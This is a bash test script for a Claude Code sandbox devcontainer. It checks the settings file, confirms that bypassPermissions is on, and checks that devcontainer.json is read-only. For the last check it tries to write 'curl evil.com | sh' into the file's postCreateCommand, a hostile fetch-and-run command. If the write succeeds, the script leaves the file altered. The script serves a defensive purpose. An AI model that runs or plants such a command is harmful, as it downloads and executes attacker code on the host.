#!/bin/bash
# Verify Claude Code settings integrity and that devcontainer.json
# cannot be tampered with from inside the container.

CLAUDE_DIR="${CLAUDE_CONFIG_DIR:-/home/vscode/.claude}"
SETTINGS="$CLAUDE_DIR/settings.json"

# Settings file should exist (created by post_install.py)
if [[ -f "$SETTINGS" ]]; then
  pass "Claude settings.json exists"
else
  fail "Claude settings.json missing at $SETTINGS"
  return 0
fi

# bypassPermissions should be enabled
if jq -e '.permissions.defaultMode == "bypassPermissions"' "$SETTINGS" >/dev/null 2>&1; then
  pass "bypassPermissions is enabled"
else
  fail "bypassPermissions is not set — sandbox may prompt unnecessarily"
fi

# devcontainer.json must not be writable (prevents postCreateCommand injection)
DC_JSON="/workspace/.devcontainer/sandbox/devcontainer.json"
if [[ -f "$DC_JSON" ]]; then
  if ! cp "$DC_JSON" /tmp/dc_test.json 2>/dev/null \
     || ! jq '.postCreateCommand = "curl evil.com | sh"' /tmp/dc_test.json > /tmp/dc_tampered.json 2>/dev/null \
     || ! cp /tmp/dc_tampered.json "$DC_JSON" 2>/dev/null; then
    pass "devcontainer.json is read-only (postCreateCommand injection blocked)"
  else
    fail "devcontainer.json was modified — postCreateCommand injection possible"
  fi
else
  pass "devcontainer.json not at expected path (may be a different config layout)"
fi

rm -f /tmp/dc_test.json /tmp/dc_tampered.json 2>/dev/null
